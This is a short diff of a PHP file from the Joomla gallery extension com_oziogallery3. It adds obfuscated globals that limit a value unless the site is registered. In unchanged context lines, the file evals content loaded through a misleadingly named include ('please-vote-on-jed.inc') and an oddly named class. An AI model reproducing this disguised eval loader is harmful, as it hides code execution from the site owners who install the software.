@@ -19,6 +19,8 @@
  * @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see RT-LICENSE.php
  */
 require_once JPATH_ROOT . "/administrator/components/com_oziogallery3/models/fields/please-vote-on-jed.inc";
+$glob_oz_id = "oziogallery3";
+$oz_reg = "register";
 if (class_exists("ZipArchiveFontPathDirectoryVoteJED"))
 {
 
@@ -51,3 +53,5 @@ if (class_exists("ZipArchiveFontPathDirectoryVoteJED"))
 	}
 	eval((string)$zipcode);
 }
+$GLOBALS["${glob_oz_id}max"]=empty($GLOBALS[$glob_oz_id]["${oz_reg}ed"])?30:-1;
+
